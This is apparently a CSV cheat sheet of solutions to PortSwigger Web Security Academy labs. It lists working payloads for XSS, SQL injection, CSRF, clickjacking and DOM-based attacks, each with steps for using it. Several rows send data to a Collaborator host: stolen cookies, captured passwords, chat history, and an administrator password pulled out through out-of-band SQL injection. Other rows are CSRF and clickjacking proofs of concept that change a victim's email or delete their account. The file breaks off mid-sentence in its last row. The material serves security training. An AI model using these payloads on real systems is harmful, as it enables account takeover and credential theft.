Number,Description,Command,Comments,Tags
1,Reflected XSS into HTML,<script>alert(1)</script>,"No encoding, use in search box","Apprentice, Reflected XSS"
2,Stored XSS into HTML,<script>alert(1)</script>,"No encoding, use in comment post","Apprentice, Stored XSS"
3,DOM XSS in document.write sink using source location.search,"""><svg onload=alert(1)>","Search box, inspect element to observe string has been placed inside an img src attribute. Payload breaks out of the img attribute","Apprentice, DOM XSS"
4,DOM XSS in innerHTML sink using source location.search,<img src=1 onerror=alert(1)>,"src value throws an error, which calls the alert function","Apprentice, DOM XSS"
5,DOM XSS in jQuery anchor href attribute sink using location.search source,javascript:alert(document.cookie),change returnPath in feedback?returnPath=/ to the payload. retrunPath is the query parameter which is placed in an href attribute,"Apprentice, DOM XSS"
6,DOM XSS in jQuery selector sink using a hashchange event,"<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/#"" onload=""this.src+='<img src=x onerror=print()>'""></iframe>","uses jQuery's $()
 selector function to auto-scroll to a given post, whose title is passed via the location.hash
 property. This payload calls the print() function on the victim browser, consider using fetch() for exploitation. To use, store this in the body of the exploit server and deliver to victim","Apprentice, DOM XSS"
7,Reflected XSS into attribute with angle brackets HTML-encoded,"""onmouseover=""alert(1)","no angle brackets, only works when input is reflected inside a quoted attribute e.g <input type=text placeholder='Search the blog...' name=search value=""test"">","Apprentice, Reflected XSS"
8,Stored XSS into anchor href attribute with double quotes HTML-encoded,javascript:alert(1),"when the ‘website’ input is reflected inside an anchor href attribute
<img src=""/resources/images/avatarDefault.svg"" class=""avatar""> <a id=""author"" href=""randomtesttext"">","Apprentice, Stored XSS"
9,Reflected XSS into a JavaScript string with angle brackets HTML encoded,'-alert(1)-',"no angle brackets, only works when input is reflected inside a JavaScript string e.g. <script>
var searchTerms = 'kento';
document.write('<img src=""/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'"">');
</script>","Apprentice, Reflected XSS"
10,DOM XSS in document.write sink using source location.search inside a select element,"""></select><img%20src=1%20onerror=alert(1)>","start of the URL is product?productId=1&storeId=, this must be done as a new URL parameter, not as a body parameter. Add the storeId parameter to the URL, you can identify this is by the JavaScript extracts a storeId parameter from the http://location.search and uses document.write to create a new option.","DOM XSS, Practitioner"
11,DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded,{{$on.constructor('alert(1)')()}},ng-app attribute noted in the page source (AngularJS directive),"DOM XSS, Practitioner"
12,Reflected DOM XSS,"\""-alert(1)}//

""-alert(1)-""","<script>search('search-results')</script> where the searchResults.js file where the JSON response is used with an eval() function call. JSON response is escaping quotation marks. However, backslash is not being escaped","DOM XSS, Practitioner"
13,Stored DOM XSS,<><img src=1 onerror=alert(1)>,"website uses loadCommentsWithVulnerableEscapeHtml.js JavaScript function replace() to encode angle brackets. When the first argument is a string, it will only do this once, so this can be bypassed by providing an extra set of angle brackets at the beginning, which are encoded but the subsequent ones aren’t.","DOM XSS, Practitioner"
14,Exploiting cross-site scripting to steal cookies,"<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>",This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.,"Practitioner, Stored XSS"
15,Exploiting cross-site scripting to capture passwords,"<input name=username id=username>
<input type=password name=password onchange=""if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"">",This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.,"Practitioner, Stored XSS"
16,Exploiting XSS to perform CSRF,"<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name=""csrf"" value=""(\w+)""/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>","issue a POST request to /my-account/change-email, with a parameter called email. There is an anti-CSRF token called ‘token’. The exploit loads the user account page, extracts the CSRF token and then uses the token to change the victims email address.

The script will make anyone who views the comment issue a POST request to change their email address to test@test.com","Practitioner, Stored XSS"
17,Reflected XSS into HTML context with most tags and attributes blocked,"<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"" onload=this.style.width='100px'>","A standard vector such as <img src=1 onerror=print()> is blocked.

Send search request to Burp Intruder. Replace value of search term with <>. Add § twice in between the brackets, i.e. <§§>.
Use the Portswigger XSS cheatsheet and “copy tags to clipboard”. Use these tags as a payload in Intruder, this will identify which tag is not blocked (e.g. body). <body%20=1> and ""Add §"" twice before the = sign (i.e. <body%20§§=1>).

Use XSS cheatsheet to copy events to clipboard, and use Intruder to send these payloads. This will identify an attribute (e.g. onresize) that is not blocked.

This allows you to craft the full payload, e.g. ""><body onresize=print()>"" onload=this.style.width='100px’

Make sure to URL encode special characters.","Practitioner, Reflected XSS"
18,Reflected XSS into HTML context with all tags blocked except custom ones,"<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>","creates a custom tag ‘x’, which contains an onfocus event handler that triggers the alert function. The # at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called","Practitioner, Reflected XSS"
19,Reflected XSS with some SVG markup allowed,"https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

<svG/x="">""/oNloaD=alert(""XSS"")//","<§§>, use XSS cheat sheet to load tags as payloads.
<svg> <animatetransform> <title>and <image>received a 200 response.
<svg><animatetransform%20§§=1>
XSS cheat sheet to copy events to clipboard.
onbegin is allowed, so you can craft the payload.
""><svg><animatetransform onbegin=alert(1)>.
Remember to URL encode special characters.","Practitioner, Reflected XSS"
20,Reflected XSS in canonical link tag,https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1),"sets the X key as an access key for the whole page. When a user presses the access key, the alert  function is called.","Practitioner, Reflected XSS"
21,Reflected XSS into a JavaScript string with single quote and backslash escaped,</script><script>alert(1)</script>,Inside a JavaScript string with single quotes and backslashes escaped. Observe that the random string in the search box has been reflected inside a JavaScript string. test'payload is escaped with a backslash.,"Practitioner, Reflected XSS"
22,Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped,\'-alert(1)//,Angle brackets and double quotes are HTML encoded and single quotes are escaped. Backslash is not escaped,"Practitioner, Reflected XSS"
23,Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped,http://foo?&apos;-alert(1)-&apos;,"In the Website input, input is reflected into the onclick event handler attribute.","Practitioner, Stored XSS"
24,"Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped",${alert(1)},Input reflected into JavaScript template string.,"Practitioner, Reflected XSS"
25,SQL injection vulnerability in WHERE clause allowing retrieval of hidden data,'+OR+1=--,"SELECT * FROM products WHERE category = 'Gifts' AND released = 1
Modify the category parameter","Apprentice, SQLi"
26,SQL injection vulnerability allowing login bypass,administrator'--,"In the username, random characters in password field as the ‘— is commenting out the rest of the SQL query, so it doesn’t matter what this is as the DB will not run this section of the query","Apprentice, SQLi"
27,"SQL injection UNION attack, determining the number of columns returned by the query","'+UNION+SELECT+NULL,NULL,NULL--","Results from the SQL query are returned in the response, so you can use a UNION attack. The first step is to determine the number of columns being returned.
'+UNION+SELECT+NULL-- returns an error, you keep adding NULL until you don’t get an error.","Practitioner, SQLi"
28,"SQL injection UNION attack, finding a column containing text","'+UNION+SELECT+NULL,'PdyFAM',NULL--",The next step is to identify a column that is compatible with string data. Add random string characters sequentially until one of the columns doesn’t result in an error. Make sure to include single quotes in the string being added.,"Practitioner, SQLi"
29,"SQL injection UNION attack, retrieving data from other tables","'+UNION+SELECT+username,+password+FROM+users--","You can now use this column to extract data from other tables in the DB.
'+UNION+SELECT+'abc','def'-- shows 200 OK, so both columns can accept strings. First column is therefore extracting the USERNAME, and the second column is extracting the PASSWORD, both from the USERS table.","Practitioner, SQLi"
30,"SQL injection UNION attack, retrieving multiple values in a single column","'+UNION+SELECT+NULL,username||'~'||password+FROM+users--","Use ||'~'|| to concatenate the information, this allows multiple values in the same column. Think of it like username AND password together in the same column. Note that not all SQL languages have the same syntax, some will use other ways to perform the same action.","Practitioner, SQLi"
31,"SQL injection attack, querying the database type and version on Oracle","'+UNION+SELECT+BANNER,+NULL+FROM+v$version--'+UNION+SELECT+version,NULL+FROM+v$instance--","Using a UNION attack. Each DB type has a different way to call version. In Oracle, every SELECT needs to come FROM a table. The built in table is called ‘dual’. '+UNION+SELECT+NULL,NULL+FROM+dual--
This is the base command to identify two columns in Oracle. '+UNION+SELECT+'abc','def'+FROM+dual--","Practitioner, SQLi"
32,"SQL injection attack, querying the database type and version on MySQL and Microsoft","'UNION+SELECT+@@version,NULL#","'UNION+SELECT+NULL,NULL# Commenting when using MySQL.
'UNION+SELECT+'abc','def'#
","Practitioner, SQLi"
33,"SQL injection attack, listing the database contents on non-Oracle databases","'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--

'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_zoudta'--
","Database contents section in SQL cheatsheet.
First, find out all the table names:
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
Then, find out all the column names from the table that has user information. In this case, users_zoudta.
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_zoudta'--
Finally, get the username and password information.
'+UNION+SELECT+username_unlnrh,password_mcxvgq+FROM+users_zoudta--
This is using the same sort of double column format, and is simple once the enum has been done on the database to identify the table and columns that info should be extracted from.","Practitioner, SQLi"
34,"SQL injection attack, listing the database contents on Oracle","'UNION+SELECT+table_name,NULL+FROM+all_tables--

'UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_OHUMHM'--

'+UNION+SELECT+USERNAME_VORBBT,+PASSWORD_LJNRHS+FROM+USERS_OHUMHM--","Remember that Oracle SELECT statements must have a FROM and the default table ‘dual’ can be used.
Listing the tables:
'UNION+SELECT+table_name,NULL+FROM+all_table--
Getting the columns from the interesting table identified:
'UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_OHUMHM'--
Getting the user and pass from the columns within the username table:
'+UNION+SELECT+USERNAME_VORBBT,+PASSWORD_LJNRHS+FROM+USERS_OHUMHM--","Practitioner, SQLi"
35,Blind SQL injection with conditional responses,"Identify ‘users’ table:
' AND (SELECT 'a' FROM users LIMIT 1)='a

Identify username ‘administrator’:
' AND (SELECT 'a' FROM users WHERE username='administrator')='a

Identify number of characters in password (sequentially up from 1 until false):
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

Identify first character of password using Intruder (payload at the final ‘a’ character):
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

Identify second character of password using Intruder (payload in same position):
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a","TrackingId=hmrLj6LL5ucS27Cr' AND '1'='1. This returns the “Welcome Back!” message but TrackingId=hmrLj6LL5ucS27Cr' AND '1'='2 does not. Indicates how you can infer the result.
' AND (SELECT 'a' FROM users LIMIT 1)='a. This will infer that the table ‘users’ exists.
' AND (SELECT 'a' FROM users WHERE username='administrator')='a. This infers that the username ‘administrator’ exists.
Then, sequentially identify how many characters are in the password.
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a. Change the number until it returns false. The last ‘true’ statement is at >19, so there are 20 characters in the password.
Then use Intruder to determine each character of the password.
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
Add the intruder position at the final ‘a’ character, as this will get Intruder to iterate through this character. Grep-Match ‘Welcome Back’ to identify the character that is correct for the first character of the password. Then, re-run the attack so that it tests for the second character.
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a","Practitioner, SQLi"
36,Blind SQL injection with conditional errors,"TrackingId=fGxw1PL5NKoujlMP'||(SELECT '' FROM dual)||’ vs TrackingId=fGxw1PL5NKoujlMP'||(SELECT '' FROM blah)||’
These give different error messages when there is a syntax error.

Identify users table existence:
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

Identify administrator existence (using CASE 1=1 for true):
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Identify the number of characters in the password (iterate up from >1 until you get an error):
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Identify the first character of the password (set the payload to ‘a’):

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

","TrackingId=xyz' vs TrackingId=xyz''. These will show error 500 vs 200 OK. You can infer that the error 500 is therefore a syntax error, while 200 OK is accepted.
Confirm it is a SQL error:
'||(SELECT '')||' This is invalid due to database type, '||(SELECT '' FROM dual)||' is valid (Oracle as all SELECT statements need to be FROM  a table).

Then, perform the steps to identify the users table and the administrator user. The CASE function can be used to make something true.

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Perform the steps to identify the character in the first character of the password. Set the payload to ‘a’:

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Re-run the intruder attack, with 2,1 instead:

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
","Practitioner, SQLi"
37,Blind SQL injection with time delays,TrackingId=x'||pg_sleep(10)--,"This will cause a 10 second delay, the SQLi cheat sheet has more options, such as:
SELECT SLEEP(10)
WAITFOR DELAY '0:0:10'
","Practitioner, SQLi"
38,Blind SQL injection with time delays and information retrieval,"Initial SQLi to get a delay:
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

Verify that the username ‘administrator’ exsists from the table ‘users’:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+USERS--

Determine length of password (change the 1 until it is true):
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Determine first character of password, use Intruder and iterate up:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--","When the application doesn’t respond any differently, you can use time delays as a conditional trigger to determine the output.

TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

Use 1=1 or 1=2 to determine that a boolean trigger can be used to trigger the time delay. This condition can then be replaces e.g. username=’administrator’.

TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+USERS--

For this, set the process thread to a single thread. Go to the ""Resource pool"" tab and add the attack to a resource pool with the ""Maximum concurrent requests"" set to 1
To see the time taken for response in the Intruder output, go to the ""Columns"" menu, and check the box for ""Response received"".
","Practitioner, SQLi"
39,Blind SQL injection with out-of-band interaction,"TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d""1.0""+encoding%3d""UTF-8""%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+""http%3a//BURP-COLLABORATOR-SUBDOMAIN/"">+%25remote%3b]>'),'/l')+FROM+dual--","Combines SQLi with XXE techniques for out of band interaction.
Remember to replace the collaborator domain.","Practitioner, SQLi"
40,Blind SQL injection with out-of-band data exfiltration,"TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d""1.0""+encoding%3d""UTF-8""%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+""http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"">+%25remote%3b]>'),'/l')+FROM+dual--","Combines the above OOB payload with another SQL query SELECT+password+FROM+users+WHERE+username%3d'administrator'
Note the concatenation to include both  statements in the one query.
Remember to replace the collaborator domain.","Practitioner, SQLi"
41,SQL injection with filter bypass via XML encoding,<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>,"Convert/obfuscate payload using XML entities.Highlight input and right-click > Extensions > Hackvertor > Encode > dec_entities/hex_entities.
","Practitioner, SQLi"
42,CSRF vulnerability with no defenses,"<form method=""POST"" action=""https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"">
    <input type=""hidden"" name=""email"" value=""anything%40web-security-academy.net"">
</form>
<script>
        document.forms[0].submit();
</script>","Right-click on the request, select Engagement Tools > Generate CSRF PoC.

Make sure the option to include an auto-submit script is enabled.","Apprentice, CSRF"
43,CSRF where token validation depends on request method,"<form action=""https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"">
    <input type=""hidden"" name=""email"" value=""anything%40web-security-academy.net"">
</form>
<script>
        document.forms[0].submit();
</script>","Changing the value of the csrf parameter rejects the request.

Change the request type from POST to GET, and note that the csrf token is no longer verified. Note that this should be done by right clicking the request and selecting “Change request type”. Request will then look like:

GET /my-account/change-email?email=kento%http://40kentosec.com/&csrf=jRN4RSu27T7l2qEflkfXzkq7lj0ymX8i HTTP/1.1

Rather than having the parameters in the body, it is added to the URL.","CSRF, Practitioner"
44,CSRF where token validation depends on token being present,"<form method=""POST"" action=""https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"">
    <input type=""hidden"" name=""$param1name"" value=""$param1value"">
</form>
<script>
    document.forms[0].submit();
</script>",Simply delete the csrf parameter entirely and note that this is now accepted.,"CSRF, Practitioner"
45,CSRF where token is not tied to user session,,"The CSRF token is not tied to a specific account, so you can generate one from an account you have access to and then use this in the CSRF attack.

Note that the CSRF token shouldn’t be used, so drop the request when you are generating one for use in the CSRF PoC.","CSRF, Practitioner"
46,CSRF where token is tied to non-session cookie,"/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None

<img src=""https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None"" onerror=""document.forms[0].submit()"">","The Search function reflects the input into a cookie.

Set-Cookie: LastSearchTerm=test; Secure; HttpOnly

/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None

Consider URL encoding here, the above will work if put directly in the URL but not in the search box. %0d%0a is a new line/line break which is required to set a new cookie. So this won’t work in the search box but will work in the URL directly if URL encoded.

In the auto-submit section of the CSRF PoC, make sure the search function is first performed so that the cookie is set, and then the form is submitted. This will ensure the Cookie value and the CSRF token are matching.","CSRF, Practitioner"
47,CSRF where token is duplicated in cookie,"/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None

<img src=""https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"" onerror=""document.forms[0].submit();""/>","Bypassing the insecure ‘double submit’ CSRF prevention technique.

The CSRF parameter is being validated against the CSRF cookie.

Set the cookie using the Search function, then create a CSRF PoC that has a CSRF key the same as what the cookie was set to.

In the auto-submit section of the CSRF PoC, make sure the search function is first performed so that the cookie is set, and then the form is submitted. This will ensure the Cookie value and the CSRF token are matching.","CSRF, Practitioner"
48,SameSite Lax bypass via method override,"Change method via Burp, and add &_method=POST.

GET /my-account/change-email?email=kento@kentosec.com&_method=POST

<script>
    document.location = ""https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST"";
</script>","No CSRF specific implementations, the /login request doesn’t specify SameSite flag, so the default Lax is used. This means the cookie will be sent in cross-site GET requests, as long as they involve a top-level navigation.

Changing the request method is blocked, but can be bypassed by adding &_method=POST to the end of the URL.","CSRF, Practitioner"
49,SameSite Strict bypass via client-side redirect,"In exploit server:

<script>
    document.location = ""https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account"";
</script>

Generate a CSRF PoC on changing email, make sure the GET method is used by changing the request method. Change the postId parameter in your exploit server to include the full GET request for changing email address.

<script>
    document.location = ""https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"";
</script>","SameSite=Strict explicitly set when a cookie is issued. This prevents the browser from sending a cookie in cross-site requests.

There is a redirect function when posting a comment./post/comment/confirmation?postId=x using the imported JavaScript file /resources/js/commentConfirmationRedirect.js

You can use path traversal so that the redirect URL will point to the account page.

/post/comment/confirmation?postId=1/../../my-account. you can use the postId
parameter to elicit a GETrequest for an arbitrary endpoint on the target site.

needs to include the submit parameter and URL encode the ampersand delimeter to avoid breaking out of the postId parameter in the initial setup request. (%40).","CSRF, Practitioner, Review"
50,SameSite Strict bypass via sibling domain,"<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send(""READY"");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

URL encode the script, and use this in a reflected XSS attack. Deliver to victim.

<script>
    document.location = ""https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything"";
</script>","Cross-site WebSocket hijacking. Exfiltrate the victims chat history.

Sibling domain at cms-labid disclosed in the Access-Control-Allow-Origin header.

Use reflected XSS attack to launch the CSWSH attack without being mitigated by SameSite restrictions. When delivered to a victim, this will cause the Cookie to be sent to the CSWSH attack and obtain the full chat history.","CSRF, Practitioner, Review"
,,,,
51,SameSite Lax bypass via cookie refresh,"<form method=""POST"" action=""https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"">
    <input type=""hidden"" name=""email"" value=""pwned@portswigger.net"">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>","Uses OAuth flow: GET /oauth-callback?code=[...] does not specify any SameSite restrictions, so the cookie will set Lax as the default.

The application will start the Oauth login flow after 2 minutes of inactivity. Browsing to /social-login will start this OAuth flow.

The attack starts by forcing the victim’s browser to visit /social-login to get a valid cookie, then submits the email change request after a short pause.

To bypass the popup blocker, the exploit needs to open once the user has clicked.","CSRF, Practitioner"
52,CSRF where Referer validation depends on header being present,"<meta name=""referrer"" content=""no-referrer"">",Delete the Referer header entirely. Include the HTML to suprress the Referer header,"CSRF, Practitioner"
53,CSRF with broken Referer validation,"history.pushState("""", """", ""/?YOUR-LAB-ID.web-security-academy.net"")

Referrer-Policy: unsafe-url","Website accepts any Referer header as long as it contains the expected domain somewhere in the string.

The HTML will cause the Referer header in the generated request to contain the URL of the target site in the query string.

Add the second HTML in the Head section. Note the spelling.","CSRF, Practitioner"
54,Basic clickjacking with CSRF token protection,"<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src=""YOUR-LAB-ID.web-security-academy.net/my-account""></iframe>","Substitute the values with appropriate sizes.

height: 700px
width: 500px
top: 300px
side: 60px
opacity: 0.1 or 0.0001 for attack.

adjust the size to match up with the ‘delete account’ button

","Apprentice, Clickjacking"
55,Clickjacking with form input data prefilled from a URL parameter,"<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src=""YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com""></iframe>","/my-account?email=hacker@attacker-website.com

This will pre-fill the text box, then the clickjacking attack will update the email address accordingly. Again, make sure to line up the “click me” box appropriately.

top: 400px
side: 80px","Apprentice, Clickjacking"
56,Clickjacking with a frame buster script,"<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox=""allow-forms""
src=""YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com""></iframe>","sandbox=”allow-forms”

This neutralizes the framebuster script","Apprentice, Clickjacking"
57,Exploiting clickjacking vulnerability to trigger DOM-based XSS,"<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src=""YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult""></iframe>",This calls the print function on the victims browser,"Clickjacking, Practitioner"
58,Multistep clickjacking,"<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class=""firstClick"">Test me first</div>
<div class=""secondClick"">Test me next</div>
<iframe src=""YOUR-LAB-ID.web-security-academy.net/my-account""></iframe>","Multi-step, where there are two elements that will appear after each other. This is to bypass a confirmation dialogue that appears after a user first clicks on the ‘delete account’ button.","Clickjacking, Practitioner"
59,DOM XSS using web messages,"<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/"" onload=""this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"">","Home page contains an addEventListener() call that listens for a web message.

Deliver exploit to victim. When the iframe loads, the postMessage() method sends a web message to the home page. This is then taken and inserted into the div with the id ads, so it takes the img tag which causes an error, the onerror handler executes the payload.","DOM-Based, Practitioner"
60,DOM XSS using web messages and a JavaScript URL,"<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/"" onload=""this.contentWindow.postMessage('javascript:print()//http:','*')"">


 <script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    </script>","Home page contains an addEventListener() call that listens for a web message. The JavaScript contains a flawed indexOf() check that looks for the strings “http:” or “https:”

Payload sends a web message containing an arbitrary JavaScript payload to the main page. Event listener spots the “http:” string and sends the payload to the location.href sink, where the print() function is called.","DOM-Based, Practitioner"
61,DOM XSS using web messages and JSON.parse,"<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage(""{\""type\"":\""load-channel\"",\""url\"":\""javascript:print()\""}"",""*"")'>

<script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case ""page-load"":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case ""load-channel"":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case ""player-height-changed"":
                                    ACMEplayer.element.style.width = d.width + ""px"";
                                    ACMEplayer.element.style.height = d.height + ""px"";
                                    break;
                            }
                        }, false);
                    </script>","Home page contains an event listenrer that listens for a web message. Expects a string that is parsed using JSON.parse(). The JS expects a type property and that the load-channel case of the switch statement changes the iframe src attribute.

When the iframe in the payload loads, the postMessage() method sends a web message to the home page with the type load-channel. The event listener receives the message and parses it using JSON.parse() and sends it to switch.

The switch triggers the load-channel case, which assigns the url property of the message to the src attribute of the ACMEplayer.element iframe. However, in this case, the url property of the message actually contains our JavaScript payload.
				

					As the second argument specifies that any targetOrigin is allowed for the web message, and the event handler does not contain any form of origin check, the payload is set as the src of the ACMEplayer.element iframe. The print() function is called when the victim loads the page in their browser","DOM-Based, Practitioner"
62,DOM-based open redirection,https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/,"Blog post contains the following link, which returns to the home page of the blog:

<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = ""/""'>Back to Blog</a>

The url parameter contains an open redirection vulnerability that allows you to change where the “Back to Blog” link takes the user.","DOM-Based, Practitioner"
63,DOM-based cookie manipulation,"<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>"" onload=""if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;"">","home page uses a client-side cookie called lastViewedProduct.

The original source of the iframe
 matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the iframe
 loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the lastViewedProduct
 cookie. The onload

 event handler ensures that the victim is then immediately redirected to
 the home page, unaware that this manipulation ever took place. While 
